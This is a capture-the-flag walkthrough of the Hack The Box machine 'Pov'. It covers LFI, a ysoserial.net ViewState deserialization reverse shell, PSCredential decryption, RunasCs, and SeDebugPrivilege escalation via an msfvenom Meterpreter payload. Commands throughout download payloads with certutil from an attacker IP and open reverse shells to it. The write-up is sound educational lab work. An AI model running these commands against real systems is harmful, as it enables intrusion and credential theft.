---
title: HTB-Pov
draft: false
tags:
  - htb
  - windows
  - medium
  - lfi
  - viewstate
  - ysoserial
  - pscredentials
  - runascs
  - sedebug
  - psgetsys
  - msfvenom
  - meterpreter
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/Pov.png)

## Information Gathering
### Rustscan

Rustscan finds only **HTTP** running on the target machine:

`rustscan --addresses 10.10.11.251 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-2.png)

Nmap default version scan discovers the http-title(**pov.htb**), which we add to `/etc/hosts`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-3.png)

## Enumeration
### HTTP - TCP 80

**pov.htb** is a website about cybersecurity company:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image.png)

At the bottom of the page, we see the potential username **sfitz**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-1.png)

Website is a pretty simple with close to zero functionality. Let's see if there are other subdomains available:

`gobuster vhost --append-domain -u http://pov.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-7.png)

**dev.pov.htb** is found. We will add it to `/etc/hosts`.

#### dev.pov.htb

The website is all about the Web Develop and UI/UX Designer, Stephen Fitz:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-4.png)

This person must be the same person as `sfitz@pov.htb`.

Let's look around the website. 

`/portfolio/contact.aspx` is a form where you can send messages but the form seems to be dead:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-6.png)

There's a function where we can download CV about Stephen Fitz:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-5.png)

There is nothing interesting about the download CV itself:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-8.png)

Let's intercept the traffic for downloading CV and take a look into it. 

## LFI

There are lot of parameters available such as **__VIEWSTATE** and **__VIEWSTATEGENERATOR**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-9.png)

We will first test if the parameter **file=** is vulnerable to Local File Inclusion(**LFI**) by trying to read `C:\Windows\win.ini`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-11.png)

This webapp is indeed vulnerable to LFI and it successfully downloads **win.ini** to our local machine:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-12.png)

We have verified there being LFI vulnerability. What file should we be reading? 

Doing some researching on this, we found out **__VIEWSTATE** could be exploited. 

## Shell as sfitz
### VIEWSTATE

You can learn more about exploiting **__VIEWSTATE** from [Hacktricks](https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter#test-case-4-.net-greater-than-4.5-and-enableviewstatemac-true-false-and-viewstateencryptionmode-true) and [here](https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817).

We would have to first find out .NET framework version. This can be found out inside `C:\web.config` file and we should be able to read this through LFI vulnerability identified.

Let's try reading `/web.config`. 

We are able to read it with no problem:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-10.png)

.NET framework seems to be version 4.5 and it also reveals **decryptionKey** and **validationKey**.

The next step is to generate a serialized payload using [YSoSerial.Net](https://github.com/pwntester/ysoserial.net).

After downloading the file, we will run the following command:

```powershell
./ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell -e JABj<snip>==" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" 
```

We know, it is very long. Let's break it down. 

`-p` parameter sets where we should copy-paste the output of the command.

`-c` parameter includes the actual powershell command we will be running. We are using base64 encoded powershell reverse shell payload [revshells](www.revshells.com).

`--validationkey` parameter includes validation key we found from **web.config**.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/pov-ps.png)


We will copy paste the output of the command to parameter **__VIEWSTATE**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-13.png)

As we forward the traffic, we get reverse shell connection as **sfitz**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-14.png)

## Privesc: sfitz to alaading
### PSCredentials

Looking around the file system, we discovered **connection.xml** file inside Documents folder:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-15.png)

It includes encrypted **PSCredentials** for user **alaading**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-16.png)

Using the command below, we can easily decrypt it:

```powershell
$cred = Import-CliXml C:\Users\sfitz\Documents\connection.xml
$cred.GetNetworkCredential() | fl
```

PSCredentials is successfully decrypted: **f8gQ8fynP44ek1m3**

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-17.png)

### RunasCs

Now that we have the credentials for user **alaading**, we should be able to run commands as him using **RunasCs.exe**.

Let's first upload **RunasCs.exe**:

`certutil.exe -urlcache -split -f http://10.10.14.36:1234/RunasCs.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-18.png)

Let's spawn reverse shell as alaading on our netcat listener:

`./RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.14.36:1338`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-19.png)

We have successfully spawned reverse shell as user alaading:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-20.png)


## Privesc: alaading to administrator
### SeDebugPrivilege

Checking on privilege alaadig has, we see **SeDebugPrivilege**, which is unusal:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-21.png)

From [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens), you can learn more about it. 

Since **SeDebugPrivilege** is disabled, let's enable it using [psgetsys.ps1](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1).

We will first upload it to the system using certutil:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-24.png)

When we run it, we can see SeDebugPrivilege enabling:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-26.png)

#### mimikatz

Let's first try dumping credentials using mimikatz. 

We will upload mimikatz.exe using certutil:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-22.png)

We tried dumping logonpasswords, but it wasn't successful for some reason:

```cmd
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-23.png)


#### Reverse Shell

Since mimikatz didn't work out, let's try to spawn a reverse shell as the administrator.

We are going to mock the process running as the system and spawn a reverse shell using it's privilege. 

**Winlogon** usually has the system privilege. Let's check out it's process ID:

`Get-Process winlogon`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-25.png)

With the process ID noted, let's create a reverse shell payload using msfvenom:

`sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.36 LPORT=3456 -f exe -o payload.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-27.png)

We will transfer the payload to the target system:

`certutil.exe -urlcache -split -f http://10.10.14.36:1234/payload.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-28.png)

Now we are almost done. We have...

- Enabled SeDebugPrivilege using psgetsys.ps1
- Noted process running as system
- Transferred payload

We will set up a listener using **msfconsole** meterpreter:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-29.png)

Let's run the payload:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-30.png)

After we get a connection on meterpreter, let's migrate to **winlogon** and spawn a shell with it:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-31.png)

We now have the shell as the system.

## References
- https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Mailing#lfi-payloads
- https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter#test-case-4-.net-greater-than-4.-5-and-enableviewstatemac-true-false-and-viewstateencryptionmode-true
- https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
- https://notes.morph3.blog/windows/privilege-escalation/sedebugprivilege